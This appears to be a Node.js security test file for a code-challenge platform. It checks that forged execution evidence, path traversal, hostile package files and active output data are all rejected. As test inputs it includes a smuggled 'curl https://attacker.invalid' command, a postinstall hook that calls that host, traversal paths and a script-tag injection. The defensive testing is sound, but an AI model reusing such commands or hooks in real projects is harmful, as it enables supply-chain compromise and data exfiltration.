import {test} from 'node:test';
import assert from 'node:assert/strict';
import {createRequire} from 'node:module';
import {createHash} from 'node:crypto';
import {readFileSync} from 'node:fs';
import {privateStorageFixture} from './private-storage-fixture.mjs';
const require=createRequire(import.meta.url),wr=createRequire(require.resolve('wrangler/package.json')),{build}=wr('esbuild');
const built=await build({stdin:{contents:'export * from "./lib/challenge-exchange/package.ts";export * from "./lib/typed-outputs.ts";',resolveDir:process.cwd()},bundle:true,format:'esm',platform:'node',write:false});
const api=await import('data:text/javascript;base64,'+Buffer.from(built.outputFiles[0].text).toString('base64'));
const digest=text=>createHash('sha256').update(text).digest('hex');
const output=code=>({contract:'minamo.outputs.v1',codeSha256:digest(code),runtime:'supplied-security-fixture',classification:'supplied-output',status:'completed',stdout:'supplied stdout; not execution',stderr:'',error:null,outputs:[{kind:'table',id:'table',label:'Supplied table',columns:['n'],rows:[[1]]}]});

test('independent attack: generic commands cannot promote reported output to observed or detach its exact code',{timeout:30000},async()=>{
 const f=await privateStorageFixture('import{domainHandler}from"./lib/domain-handler.ts";export default{fetch:domainHandler}'),a=f.client('security-owner'),b=f.client('security-other'),code='print(1)\n';
 try{
  const created=await a.command({action:'create',family:'run',id:'security-reported-run',data:{title:'TEST ONLY reported output',body:'Synthetic security test, not actual execution.',code,engine:'python',evidence:'illustrative',synthetic:true,outputBundle:output(code)}});
  assert.equal(created.status,200,JSON.stringify(created.data));const record=created.data.record;
  assert.equal(record.outputBundle.classification,'supplied-output');
  for(const data of [{evidence:'observed'},{code:'print(2)\n'},{outputBundle:{...output(code),classification:'minamo-observed'}},{outputBundle:{...output(code),receipt:{verified:true}}}]){
   const denied=await a.command({action:'update',family:'run',id:record.id,expectedRev:record.rev,data});assert.ok([400,409].includes(denied.status),JSON.stringify(denied.data));
  }
  const current=await a.context('run',record.id);assert.equal(current.data.record.rev,record.rev);assert.equal(current.data.record.code,code);assert.equal(current.data.record.evidence,'illustrative');
  assert.equal((await b.context('run',record.id,record.rendition)).status,404);
  const mcp=await a.request('/mcp',{jsonrpc:'2.0',id:1,method:'tools/call',params:{name:'apply_minamo_command',arguments:{purpose:'Negative synthetic attempt to forge observed output.',command:{operationId:'security-mcp-forged-output',action:'create',family:'run',id:'security-forged-run',data:{title:'TEST ONLY forbidden evidence',code,engine:'python',evidence:'observed',synthetic:true,outputBundle:output(code)}}}}});
  assert.equal(mcp.status,200);assert.equal(mcp.data.result.isError,true);assert.match(mcp.data.result.content[0].text,/unattested_execution/);
 }finally{await f.dispose();}
});

test('independent attack corpus rejects ambiguous extraction paths, shell metadata and active output data',async()=>{
 for(const path of ['../answer.py','src/../../answer.py','/answer.py','C:/answer.py','src\\answer.py','src/.git/config.py','CON.py','src/aux.py','a//b.py','a/./b.py','a/secret.py\0','a/answer.py:zone','a/NUL.txt'])assert.throws(()=>api.validateProjectPath(path),undefined,path);
 const input={id:'security-package',title:'Original supplied challenge',runtime:'node',files:[{path:'starter.mjs',role:'editable-starter',text:'export const n=0;\n'},{path:'test.mjs',role:'visible-test',text:'import {n} from "./starter.mjs";\n'}]};
 const valid=await api.buildProjectPackage(input);const hostile=structuredClone(valid);hostile.commands.kali='node --test; curl https://attacker.invalid';await assert.rejects(api.admitProjectPackage(hostile),e=>e.code==='unsafe_command');
 for(const file of [{path:'package.json',text:'{"scripts":{"postinstall":"curl https://attacker.invalid"}}'},{path:'Package.JSON',text:'{"dependencies":{"unreviewed-package":"1"}}'},{path:'Cargo.toml',text:'[package]\nname="example"\nversion="0.1.0"\n[dependencies]\nunreviewed="1"\n'},{path:'MINAMO-MANIFEST.json',text:'{}'},{path:'secret.txt',text:'-----BEGIN OPENSSH PRIVATE KEY-----\nTEST ONLY NOT A KEY\n'}]){
  await assert.rejects(api.buildProjectPackage({...input,files:[...input.files,{...file,role:'teaching-only'}]}));
 }
 for(const mutation of [v=>({...v,html:'<script>bad()</script>'}),v=>({...v,outputs:[{kind:'image',id:'img',label:'bad',mime:'image/png',url:'https://attacker.invalid/image.png'}]}),v=>({...v,outputs:[{kind:'table',id:'bad',label:'bad',columns:['x'],rows:[[Infinity]]}]}),v=>({...v,status:'interrupted'}),v=>({...v,status:'error',error:'failed'})])assert.throws(()=>api.admitTypedOutputBundle(mutation(output('print(1)\n'))));
});

test('untrusted scientific runtime has no owner-origin grant and remains absent from default package policy',()=>{
 const controller=readFileSync('lib/foundry/python-runtime.ts','utf8');
 // Static containment regression only. Browser denial/CPU enforcement is a separate proof level.
 assert.match(controller,/frame\.sandbox\.add\('allow-scripts'\)/);assert.doesNotMatch(controller,/sandbox\.add\([^)]*allow-same-origin/);
 assert.match(controller,/default-src 'none'/);assert.match(controller,/connect-src blob:/);assert.match(controller,/worker-src blob:/);
 assert.match(controller,/event\.source!==frame\.contentWindow/);assert.match(controller,/event\.data\?\.token!==token/);assert.match(controller,/frame\.remove\(\)/);
 const trusted=readFileSync('vendor/foundry-python-isolate.js','utf8');assert.match(trusted,/worker\.terminate\(\)/);assert.match(trusted,/30000/);
 const policy=readFileSync('scripts/foundry-package-policy.mjs','utf8');assert.match(policy,/MINAMO_FOUNDRY_PACKAGE_SCIENCE==='1'/);
});
